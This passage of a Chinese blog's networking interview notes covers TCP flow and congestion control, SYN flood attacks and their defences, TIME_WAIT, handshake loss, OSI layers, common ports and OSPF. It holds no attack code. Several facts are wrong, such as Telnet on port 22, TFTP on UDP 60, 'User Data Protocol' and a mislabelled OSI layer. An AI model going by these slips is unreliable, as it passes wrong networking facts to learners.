class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">滑动窗口</span><br><span class=\"line\">TCP连接每一方的接收缓冲空间大小都固定，接收端只允许另一端发送接收端缓冲区所能接纳的数据，TCP在滑动窗口的基础上提供流量控制，防止较快主机致使较慢主机的缓冲区溢出；TCP也是一样的，除了入口有发送方滑动窗口，出口处也设立有接收方滑动窗口。</span><br><span class=\"line\">拥塞控制</span><br><span class=\"line\">防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不致过载。</span><br><span class=\"line\">拥塞控制避免</span><br><span class=\"line\">慢开始( slow-start )、拥塞避免( congestion avoidance )、快重传( fast retransmit )和快恢复( fast recovery )。</span><br><span class=\"line\">发送方维持一个拥塞窗口 cwnd ( congestion window )的状态变量。拥塞窗口的大小取决于网络的拥塞程度，并且动态地在变化。发送方让自己的发送窗口等于拥塞。</span><br><span class=\"line\">发送方控制拥塞窗口的原则是：只要网络没有出现拥塞，拥塞窗口就再增大一些，以便把更多的分组发送出去。但只要网络出现拥塞，拥塞窗口就减小一些，以减少注入到网络中的分组数。</span><br><span class=\"line\">慢开始算法：当主机开始发送数据时，如果立即所大量数据字节注入到网络，那么就有可能引起网络拥塞，因为现在并不清楚网络的负荷情况。因此，较好的方法是 先探测一下，即由小到大逐渐增大发送窗口，也就是说，由小到大逐渐增大拥塞窗口数值。通常在刚刚开始发送报文段时，先把拥塞窗口 cwnd 设置为一个最大报文段MSS的数值。而在每收到一个对新的报文段的确认后，把拥塞窗口增加至多一个MSS的数值。用这样的方法逐步增大发送方的拥塞窗口 cwnd ，可以使分组注入到网络的速率更加合理。</span><br><span class=\"line\">...自己看吧，我也不知道这啥玩意</span><br><span class=\"line\">https://blog.csdn.net/qq_41431406/article/details/97926927</span><br><span class=\"line\">https://blog.csdn.net/ligupeng7929/article/details/79597423</span><br></pre></td></tr></table></figure>\n<h4 id=\"tcp-syn-flood-防御快手\"><a class=\"markdownIt-Anchor\" href=\"#tcp-syn-flood-防御快手\">#</a> TCP syn flood 防御 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用TCP三次握手协议，大量与服务器建立半连接，服务器默认需要重试5次，耗时63s才会断开接，这样，攻击者就可以把服务器的syn连接队列耗尽，让正常的连接请求不能处理。</span><br><span class=\"line\">最直接的做法就是提高服务能力，比如组建集群，升级硬件。</span><br><span class=\"line\">对于防火墙这类安全设备而言，SYN报文是正常的业务报文，防火墙的安全策略必须允许其通过，否则服务器就无法对外提供服务。</span><br><span class=\"line\">如果能明确虚假源的IP地址，就能通过精细的安全策略阻止这些源发来的SYN报文。</span><br><span class=\"line\">此时需要anti-DDoS。Anti-DDoS系统处理SYN报文主要有两种手段，源认证和首包丢弃。</span><br><span class=\"line\">Anti-DDoS系统拦截客户端发送的SYN报文，代替服务器向客户端发送SYN-ACK报文，如果客户端不应答，则认为该客户端为虚假源；如果客户端应答，则Anti-DDoS系统认为该客户端为真实源，并将其IP地址加入白名单，在一段时间允许该源发送的所有SYN报文通过，也不做代答。</span><br><span class=\"line\">如果Anti-DDoS系统代替服务器应答了所有的SYN Flood攻击报文，那么性能瓶颈仅仅是从服务器转移到了Anti-DDoS系统而已。一旦Anti-DDoS系统的系统资源耗尽，攻击依旧会透传到服务器，而且大量反弹的SYN-ACK报文也会对网络造成一定的压力。Anti-DDoS系统利用首包丢弃来解决这个问题。</span><br><span class=\"line\">TCP协议的可靠性不仅体现在三次握手，还体现在超时与重传的机制。正常情况下客户端发送SYN报文后如果在一定时间没有收到服务器的SYN-ACK应答，客户端会重新发送SYN报文。Anti-DDoS系统会丢弃掉收到的第一个SYN报文。SYN Flood攻击时，黑客发送的绝大多数是变源的SYN报文，所有的SYN报文对于Anti-DDoS系统来说都是首包，都将被直接丢弃。如果客户端重传了SYN报文，Anti-DDoS系统再对该报文进行源认证。如此一来，大大减少了Anti-DDoS系统代答的压力。首包丢弃和源认证两种手段结合，对于防御SYN Flood（特别是不断变换源IP和源端口的虚假源攻击）非常有效。</span><br><span class=\"line\">hping3</span><br><span class=\"line\">hping3是一个很有名的网络安全工具，使用它可以很容易构造各种协议包。</span><br><span class=\"line\">增大tcp_max_syn_backlog   增大队列用来存放还没有确认ACK的客户端请求</span><br><span class=\"line\">减小tcp_synack_retries    减少服务端重发ack的次数</span><br><span class=\"line\">启用tcp_syncookies\t\t当启用tcp_syncookies时，backlog满了后，linux内核生成一个特定的n值，而不并把客户的连接放到半连接的队列backlog里（即没有存储任何关于这个连接的信息，不浪费内存）。当客户端提交第三次握手的ACK包时，linux内核取出n值，进行校验，如果通过，则认为这个是一个合法的连接。</span><br><span class=\"line\"></span><br><span class=\"line\">过滤</span><br><span class=\"line\">增加积压</span><br><span class=\"line\">减少SYN-RECEIVED定时</span><br><span class=\"line\">复用古老的半开通TCP</span><br><span class=\"line\">SYN缓存</span><br><span class=\"line\">SYN Cookie</span><br><span class=\"line\">混合方法</span><br><span class=\"line\">防火墙和代理</span><br></pre></td></tr></table></figure>\n<h4 id=\"tcp和udp区别茄子汉得\"><a class=\"markdownIt-Anchor\" href=\"#tcp和udp区别茄子汉得\">#</a> tcp 和 UDP 区别 (茄子，汉得)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">TCP（Transmission Control Protocol，传输控制协议）是面向连接的协议</span><br><span class=\"line\">UDP（User Data Protocol）是一个非连接的协议，传输数据之前源端和终端不建立连接</span><br><span class=\"line\"></span><br><span class=\"line\">2.UDP和TCP报头长度</span><br><span class=\"line\">UDP 8字节</span><br><span class=\"line\">TCP 20字节</span><br><span class=\"line\"></span><br><span class=\"line\">3.</span><br><span class=\"line\">UDP面向报文，尽力而为，没有拥塞控制等算法</span><br><span class=\"line\">TCP可靠，有差错校验，滑动窗口，流控，面向字节流</span><br><span class=\"line\"></span><br><span class=\"line\">4.</span><br><span class=\"line\">TCP只能点到点全双工，UDP支持一对一，一对多，多对一</span><br><span class=\"line\"></span><br><span class=\"line\">5.</span><br><span class=\"line\">TCP要求的系统资源较多，UDP较少</span><br></pre></td></tr></table></figure>\n<h4 id=\"tcp四次挥手timewait作用长亭\"><a class=\"markdownIt-Anchor\" href=\"#tcp四次挥手timewait作用长亭\">#</a> tcp 四次挥手 timewait 作用 (长亭)</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/7bc94edb74608af80fbb4de8ab9c1bd7.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/11bd3c08694c9f869c3607fe32edb8ff.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">timewait的作用：</span><br><span class=\"line\">为了确保最后的 ACK 能让被动关闭方接收，从而帮助其正常关闭。</span><br><span class=\"line\">在这里，如果图中主机 1 的 ACK 报文没有传输成功，那么主机 2 就会重新发送 FIN 报文。如果主机 1 没有维护 TIME_WAIT 状态，而直接进入 CLOSED 状态，它就失去了当前状态的上下文，只能回复一个 RST 操作，从而导致被动关闭方出现错误。而重发fin一来一去正好两个MSL</span><br><span class=\"line\">让之前因为某些原因延迟到达路由器的报文消失，如果关闭的连接被重用了，那么这些延迟收到的包就有可能会跟新连接混在一起</span><br><span class=\"line\">time-wait是从主机A收到FIN后发送ack开始计时的</span><br><span class=\"line\"></span><br><span class=\"line\">timewait的危害</span><br><span class=\"line\">第一是内存资源占用</span><br><span class=\"line\">第二是对端口资源的占用，一个 TCP 连接至少消耗一个本地端口。</span><br></pre></td></tr></table></figure>\n<h4 id=\"为啥挥四次握三次长亭\"><a class=\"markdownIt-Anchor\" href=\"#为啥挥四次握三次长亭\">#</a> 为啥挥四次握三次 (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">为了保证A发送的最有一个ACK报文段能够到达B。</span><br><span class=\"line\">没有数据传输，服务端的SYN和ACK报文可以一起发送，但是挥手时有数据传输,等待自己的数据传输完成后再ACK，ACK和FIN报文不能同时发送</span><br></pre></td></tr></table></figure>\n<h4 id=\"接下来是八股文时间~\"><a class=\"markdownIt-Anchor\" href=\"#接下来是八股文时间~\">#</a> 接下来是八股文时间：~</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00 TCP第一次握手SYN包丢包</span><br><span class=\"line\">重传第一个包，重传次数由/proc/sys/net/ipv4/tcp_syn_retries决定，每次重传的时间翻倍上涨的，直至达到tcp_syn_retries决定，不在重传，开始摆烂</span><br><span class=\"line\">1 2 4 8 16 32 酱紫翻倍的</span><br><span class=\"line\"></span><br><span class=\"line\">0x01 TCP第二次握手SYN包丢包</span><br><span class=\"line\">客户端无法收到synack包，会重传syn。</span><br><span class=\"line\">服务端收到客户的SYN包后，就会回SYN、ACK包，但是客户端一直没有回ACK，服务端在超时后，重传了 </span><br><span class=\"line\">SYN、ACK 包，接着一会，客户端超时重传的SYN包又抵达了服务端，服务端收到后，超时定时器就重新</span><br><span class=\"line\">计时，然后回SYN、ACK包，所以相当于服务端的超时定时器只触发了一次，又被重置了；</span><br><span class=\"line\">当第二次握手的SYN、ACK丢包时，客户端会超时重发SYN包，服务端也会超时重传SYN、ACK包。同时客户端重传次数由tcp_syn_retries决定</span><br><span class=\"line\"></span><br><span class=\"line\">0x02</span><br><span class=\"line\">TCP第三次握手SYN包丢包</span><br><span class=\"line\">如果第三次握手的ACK，服务端无法收到，则服务端就会短暂处于SYN_RECV状态，并且依次等待3秒、6秒、12秒后重新发送SYN+ACK包，而客户端会处于 ESTABLISHED 状态。由于服务端一直收不到TCP第三次握手的ACK，则会一直重传SYN、ACK包，直到重传次数超过tcp_synack_retries,直至重传次数超过tcp_synack_retries</span><br><span class=\"line\"></span><br><span class=\"line\">0x03</span><br><span class=\"line\">// 第一次握手重传次数限制</span><br><span class=\"line\">cat /proc/sys/net/ipv4/tcp_syn_retries</span><br><span class=\"line\"></span><br><span class=\"line\">// 第二次握手重传次数限制</span><br><span class=\"line\">cat /proc/sys/net/ipv4/tcp_synack_retries</span><br><span class=\"line\"></span><br><span class=\"line\">// 数据包最大重传次数限制</span><br><span class=\"line\">cat /proc/sys/net/ipv4/tcp_retries2</span><br><span class=\"line\"></span><br><span class=\"line\">参考链接：https://juejin.cn/post/6844904181795389454</span><br><span class=\"line\">师傅在文章里还有详细截图，看不懂我写的可以去看他写的~</span><br><span class=\"line\"></span><br><span class=\"line\">0x04 TCP第一次挥手FIN包丢包</span><br><span class=\"line\">client发的FIN包丢了，对于client，因为没收对应的ACK包，应当一直重传(像普通包一样)，直至到达上限次数，直接关闭连接；对于server，它应该无任何感知；</span><br><span class=\"line\"> </span><br><span class=\"line\">0x05 TCP第二次挥手ACK包丢包</span><br><span class=\"line\">server回client的ACK包丢了，对于client，将执行（1），对于server将像丢普通的ack一样，再次收到FIN后，再发一个ACK包；</span><br><span class=\"line\"></span><br><span class=\"line\">0x06 TCP第三次挥手FIN包丢包</span><br><span class=\"line\">如果client收到ACK后，server直接跑路。client将永远停留在这个状态（半打开状态，就像client关闭了输出一样）。linux有tcp_fin_timeout这个参数，设置一个超时时间 cat /proc/sys/net/ipv4/tcp_fin_timeout 查看，默认60s。</span><br><span class=\"line\">server发的FIN包丢了，对于server，像丢普通的包一样，重传。若此时client早已跑路且与其他人建立的连接，client应会不认识这个FIN包，直接回个RST包给server。如若client没跑路，且没收到server的FIN包，如（3）描述；</span><br><span class=\"line\"></span><br><span class=\"line\">0x07 TCP第三次挥手ACK包丢包</span><br><span class=\"line\">防止回复的ACK包丢失（丢失后，server因为没收FIN的ACK，所以会再发一个FIN），将等待2MSL(最大报文存活时间)</span><br><span class=\"line\"></span><br><span class=\"line\">0x08 大结局</span><br><span class=\"line\">syn = 1丢了 计时器超时后重传第一个包(syn=1)</span><br><span class=\"line\">syn = 1, ack = 1丢了 重传第一个(syn=1)和第二个包(syn=1,ack=1)</span><br><span class=\"line\">ack = 1丢了 等待3秒、6秒、12秒后重新发送第二个(syn=1,ack=1)包</span><br><span class=\"line\">客户端fin = 1丢了 重传第一个包(fin=1)</span><br><span class=\"line\">服务端ack = 1丢了 重传第一个(fin=1)和第二个包(ack=1)</span><br><span class=\"line\">服务端fin = 1丢了 服务端重传第三个包(fin=1),client行为分类讨论，如果已经和别人建立了连接，那么回RST，如果没跑路，那么client将永远停留在这个状态(fin-wait)</span><br><span class=\"line\">客户端ack = 1丢了 服务端重传第三个包(fin=1),客户端等待Time-wait，即2MSL</span><br><span class=\"line\">如果他接下来再问你wait-time是干啥的，你直接创他</span><br><span class=\"line\">但我上面写了，别说我没写</span><br><span class=\"line\"></span><br><span class=\"line\">链接：https://www.cnblogs.com/quehualin/p/10409607.html</span><br><span class=\"line\">这个师傅写得很详细，师傅流啤~</span><br></pre></td></tr></table></figure>\n<h3 id=\"4osi相关\"><a class=\"markdownIt-Anchor\" href=\"#4osi相关\">#</a> 4.OSI 相关</h3>\n<h4 id=\"路由协议分类宏杉中科曙光信锐\"><a class=\"markdownIt-Anchor\" href=\"#路由协议分类宏杉中科曙光信锐\">#</a> 路由协议分类 (宏杉，中科曙光，信锐)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">从大类分，分为BGP和IGP 即内部网关和边界网关协议</span><br><span class=\"line\">BGP 中只有BGP这一个协议,BGP 又可以称为路径矢量型协议</span><br><span class=\"line\">IGP 中可以分为两大类：</span><br><span class=\"line\">\t距离矢量: RIP,EIGRP(高级的距离矢量型协议，Cisco私有)</span><br><span class=\"line\">\t链路状态：ISIS ,OSPF</span><br><span class=\"line\">然后慢慢扩展吧，千万别说完这个就不说了，你说说每个协议的应用场景等</span><br></pre></td></tr></table></figure>\n<h4 id=\"ositcpip区别\"><a class=\"markdownIt-Anchor\" href=\"#ositcpip区别\">#</a> osi/tcpip 区别</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OSI:\t\t\t\t\t\t\tTCP/IP</span><br><span class=\"line\">应用层\t\t\t\t\t\t\t应用层\t\t</span><br><span class=\"line\">表示层\t\t\t</span><br><span class=\"line\">会话层</span><br><span class=\"line\">传输层\t\t\t\t\t\t\t传输层</span><br><span class=\"line\">网络层\t\t\t\t\t\t\t网路层</span><br><span class=\"line\">数据链路层\t\t\t\t\t  网络接口层</span><br><span class=\"line\">网络层</span><br><span class=\"line\"></span><br><span class=\"line\">层数不同—-OSI为7层，TCP/IP为四层或五层</span><br><span class=\"line\">TCP/IP支持跨层封装；OSI不支持  跨层封装主要用于非终端设备间相互沟通的流量，非远距离；</span><br><span class=\"line\">TCP/IP仅仅支持IP网络协议;  OSI支持多种网络层协议（IP    IPX    APPLE  TALK    NOVELL   NSAP）</span><br><span class=\"line\">TCP/IP 参考模型没有对网络接口层进行细分，只是一些概念性的描述； OSI 参考模型对服务和协议做了明确的区分。</span><br><span class=\"line\">OSI 先有模型，后有协议规范，适合于描述各种网络；TCP/IP 是先有协议集然后建立模型，不适用于非 TCP/IP 网络。</span><br><span class=\"line\">TCP/IP 一开始就提出面向连接和无连接服务，而 OSI 一开始只强调面向连接服务，直到很晚才开始制定无连接的服务标准。</span><br><span class=\"line\">OSI 实现起来较困难；相反，TCP/IP作为一种简化的分层结构还是比较成功的。</span><br></pre></td></tr></table></figure>\n<h4 id=\"二层三层交换机的区别深信服\"><a class=\"markdownIt-Anchor\" href=\"#二层三层交换机的区别深信服\">#</a> 二层三层交换机的区别 (深信服)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">二层交换机属数据链路层设备</span><br><span class=\"line\">三层交换机工作在网络层</span><br><span class=\"line\"></span><br><span class=\"line\">二层交换机的原理是当交换机从某个端口收到一个数据包，它会先读取包中的源MAC地址，再去读取包中的目的MAC地址，并在地址表中查找对应的端口，如表中有和目的MAC地址对应的端口，就把数据包直接复制到这个端口上。</span><br><span class=\"line\">三层交换机的原理比较简单，就是一次路由多次交换，通俗来说就是第一次进行源到目的的路由，三层交换机会将此数据转到二层，那么下次无论是目的到源还是源到目的都可以进行快速交换。</span><br><span class=\"line\"></span><br><span class=\"line\">二层交换机基于MAC地址访问，只做数据的转发，并且不能配置IP地址</span><br><span class=\"line\">三层交换机将二层交换技术和三层转发功能结合在一起，也就是说三层交换机在二层交换机的基础上增加了路由功能，可配置不同VLAN的IP地址，可通过三层路由实现不同VLAN之间通讯。</span><br><span class=\"line\"></span><br><span class=\"line\">二层交换机主要用于网络接入层和汇聚层</span><br><span class=\"line\">三层交换机主要用于网络核心层，但是也存在少部分三层交换机用于汇聚层的现象</span><br></pre></td></tr></table></figure>\n<h4 id=\"osi每层协议长亭招联中科曙光\"><a class=\"markdownIt-Anchor\" href=\"#osi每层协议长亭招联中科曙光\">#</a> OSI 每层协议 (长亭，招联，中科曙光)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">应用层:</span><br><span class=\"line\">http/https 80/443</span><br><span class=\"line\">dns 53</span><br><span class=\"line\">snmp 161/162</span><br><span class=\"line\">smtp 25</span><br><span class=\"line\">ftp 20/21</span><br><span class=\"line\">pop3 110</span><br><span class=\"line\">telnet 22</span><br><span class=\"line\"></span><br><span class=\"line\">表示层</span><br><span class=\"line\">GIF</span><br><span class=\"line\">JPEG</span><br><span class=\"line\">ASCII</span><br><span class=\"line\">HTML</span><br><span class=\"line\">encryption</span><br><span class=\"line\"></span><br><span class=\"line\">会话层：</span><br><span class=\"line\">NetBIOS</span><br><span class=\"line\">AppleTalk</span><br><span class=\"line\">NFS</span><br><span class=\"line\"></span><br><span class=\"line\">传输层：</span><br><span class=\"line\">tcp</span><br><span class=\"line\">udp</span><br><span class=\"line\"></span><br><span class=\"line\">网络层：</span><br><span class=\"line\">IP，IPX</span><br><span class=\"line\"></span><br><span class=\"line\">数据链路层</span><br><span class=\"line\">FR</span><br><span class=\"line\">HDLC</span><br><span class=\"line\">PPP</span><br><span class=\"line\">802.3</span><br><span class=\"line\">ATM</span><br><span class=\"line\"></span><br><span class=\"line\">物理层</span><br><span class=\"line\">RJ45</span><br><span class=\"line\">Ethernet</span><br><span class=\"line\"></span><br><span class=\"line\">TCP/IP</span><br><span class=\"line\">应用层：参考OSI</span><br><span class=\"line\">传输层：TCP,UDP</span><br><span class=\"line\">网络层：ICMP，IGMP</span><br><span class=\"line\">数据链路层：ARP</span><br><span class=\"line\"></span><br><span class=\"line\">你真想混起来将我觉得也没事，估计面试官也分不清楚，我之前一致混起来讲的，面试官听得挺开心，我讲的也挺开心~</span><br><span class=\"line\">毕竟分太细容易把自己埋了，他不问你不说，大家dddd</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">顺带着我就把常见端口写了</span><br><span class=\"line\">http/https tcp 80/443</span><br><span class=\"line\">dns tcp+udp 53</span><br><span class=\"line\">snmp udp 161/162</span><br><span class=\"line\">smtp tcp 25</span><br><span class=\"line\">ftp tcp 20/21</span><br><span class=\"line\">pop3 tcp 110</span><br><span class=\"line\">telnet 23</span><br><span class=\"line\">dhcp 67/68</span><br><span class=\"line\">ssh 22</span><br><span class=\"line\">tftp udp 60</span><br><span class=\"line\">JBOSS  Tomcat 8080</span><br><span class=\"line\">RDP 3389</span><br><span class=\"line\">Oracle 1521</span><br><span class=\"line\">mssql tcp/udp 1433,1434</span><br><span class=\"line\">mysql 3306</span><br><span class=\"line\">samba 139</span><br><span class=\"line\">ladp 389</span><br><span class=\"line\">redis 6379</span><br><span class=\"line\">weblogic 7001</span><br></pre></td></tr></table></figure>\n<h4 id=\"封装解封装长亭\"><a class=\"markdownIt-Anchor\" href=\"#封装解封装长亭\">#</a> 封装解封装 (长亭)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">应用层，人机交互接口，接收用户输入</span><br><span class=\"line\">表示层，将接收到的数据翻译成二进制数组成的计算机语言，并对数据进行压缩和解压、数据加密和解密等工作</span><br><span class=\"line\">会话层，建立、管理、中止会话。</span><br><span class=\"line\">传输层，为每个数据封装 TCP或UDP 报文头部。 在头部有一个关键的字段信息——端口号，它用于标识上层的协议或应用程序，确保上层应用数据的正常通信。</span><br><span class=\"line\">网络层，上层数据被封装上新的报文头部——IP 头部。 在 IP 头部中有一个关键的字段信息——IP 地址，进行逻辑地址寻址</span><br><span class=\"line\">数据链路层，上层数据被封装一个 MAC 头部，其内部有一个关键的字段信息 ——MAC 地址，在 MAC 头部也同时封装着目标 MAC 地址和源 MAC 地址，进行硬件地址寻址、差错校验等功能。</span><br><span class=\"line\">在物理层，将这些二进制数字组成的比特流转换成电信号在网络中传输。</span><br><span class=\"line\"></span><br><span class=\"line\">在物理层，首先将电信号转换成二进制数据，并将数据送至数据链路层</span><br><span class=\"line\">在数据链路层， 将查看目标 MAC 地址，判断其是否与自己的 MAC 地址吻合，并据此完成后续处理。如果 数据报文的目标 MAC 地址就是自己的 MAC 地址，数据的 MAC 头部将被“拆掉”，并将剩余 的数据送至上一层；如果目标 MAC 地址不是自己的 MAC 地址，对于终端设备来说，它将 会丢弃数据</span><br><span class=\"line\">在网络层与在数据链路层类似，目标 IP 地址将被核实是否与自己的 IP 地址相 同，从而确定是否送至上一层</span><br><span class=\"line\">到了传输层，首先要根据 TCP 头部判断数据段送往哪个应用层协议或应用程序，然后将之前被分组的数据段重组，再送往应用层</span><br><span class=\"line\">会话层，建立、管理、中止会话。</span><br><span class=\"line\">表示层，将接收到的二进制变为应用的数据，并对数据进行压缩和解压、数据加密和解密等工作</span><br><span class=\"line\">在应用层，这些数据将经历复杂的解码过程，以还原发送者所传输的原始信息。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"5ospf相关\"><a class=\"markdownIt-Anchor\" href=\"#5ospf相关\">#</a> 5.OSPF 相关</h3>\n<h4 id=\"ospf负载分担快手\"><a class=\"markdownIt-Anchor\" href=\"#ospf负载分担快手\">#</a> ospf 负载分担 (快手)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">华为产品文档ospf cost命令原话</span><br><span class=\"line\">当有多条发现协议、开销值、目的地址都相同的路由时，这几条路由就满足负载分担的条件。请根据实际组网情况，通过修改接口开销值来选择是否需要进行负载分担。</span><br></pre></td></tr></table></figure>\n<h4 id=\"需要a-b不负载分担回程不管在哪配开销来回路径不一致有问题吗快手\"><a class=\"markdownIt-Anchor\" href=\"#需要a-b不负载分担回程不管在哪配开销来回路径不一致有问题吗快手\">#</a> 需要 A-&gt;B 